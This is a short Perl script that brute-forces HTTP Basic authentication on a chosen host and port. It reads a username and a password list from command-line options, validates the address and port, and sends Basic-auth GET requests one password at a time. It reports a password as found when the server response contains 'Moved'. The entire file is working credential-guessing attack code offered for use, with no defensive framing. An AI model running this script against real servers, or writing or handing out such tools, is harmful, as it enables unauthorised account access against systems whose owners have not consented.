use IO::Socket;
use LWP::Simple;
use feature 'say';
use MIME::Base64;
use Getopt::Std;


my %opts = (
    a  => '',                   
    w => '',
);

# h = Host address 
# u = UserName 
# p = Port
# l = password list 
# f = file for save passwords
getopt('h:u:p:l:f:', \%opts);


@months = qw( Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec );
@days = qw(Sun Mon Tue Wed Thu Fri Sat Sun);
$host     = $opts{h};
$user     = $opts{u};
$port     = $opts{p};
$list     = $opts{l}; # do not make this a mandatory option
$file     = $opts{f};
$url = "http://".$host.":".$port;

headx();
$numstart  = "-1";
$| = 1;
sub port_scanner_slash_check() {$socket = IO::Socket::INET->new(Proto => tcp,PeerAddr => $host,PeerPort => $port,);if($@) {print "\033[31mFailed to connect on port $port using host $host\033[39m\n"} else {print "\033[32m[*] Setting: Port is open -> $port Con made on host -> $url\n"}}
sub check_port() {my $regex = "^([1-9][0-9]{0,3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])";if($port =~ "^([1-9][0-9]{0,3}|[1-5][0-9]{4}|6[0-4][0-9]{3}|65[0-4][0-9]{2}|655[0-2][0-9]|6553[0-5])") {print "[*] Port matches to regex  -> $regex\n";print "[*] Setting: Port Verified ->  $port\n";} else {say "\033[31m[!] WARN: FATAL: ERR: EXIT -> Reason?\n";say "[!] $port failed to match regex string \n";say "[!] $regex\n";}}
sub ip_check(){my $ip = "$host:$port";my $regex = "/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5})/";if($ip =~ /(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5})/){print "\n[*] Address matches with RE string -> $1\n";print "\n[*] Setting: Target port -> $ip\n"} else {say "\033[31m[!] WARN: FATAL: Tested $ip with regex $regex just for it to come back";say "\033[31m[!] WARN: False, this address is not real must be char";exit();}}
sub headx() {ip_check();check_port();port_scanner_slash_check();say "[*] Setting: Target URL -> $url";say "[*] Setting: target     -> $host";say "[*] Setting: User       -> $user";say "[*] Setting: Port       -> $port";say "[*] Setting: Pass-List  -> $file";say "[*] Setting: File       -> $file";open (PASSFILE, "<$list") || die "[-] Can't open the List of password file !";@PASSWORDS = <PASSFILE>;close PASSFILE;foreach my $P (@PASSWORDS) {chomp $P;$passwd = $P;print "\n [*] Trying password -> $passwd \n";&brute;};}
sub brute() {$authx = encode_base64($user.":".$passwd);print $authx;my $socket = IO::Socket::INET->new(Proto => "tcp",PeerAddr => "$host", PeerPort => "$port") || print "\n [-] Can not connect to the host";print $socket  "GET / HTTP/1.1\n";print $socket "Authorization: Basic $authx\n";print $socket "Connection: Close\n\n";read  $socket, $answer, 128;close($socket);if ($answer =~ /Moved/) {print "\n [~] PASSWORD FOUND : $passwd \n";print("[*] Finished scan at -> $hour:$min:$sec\n");exit();}}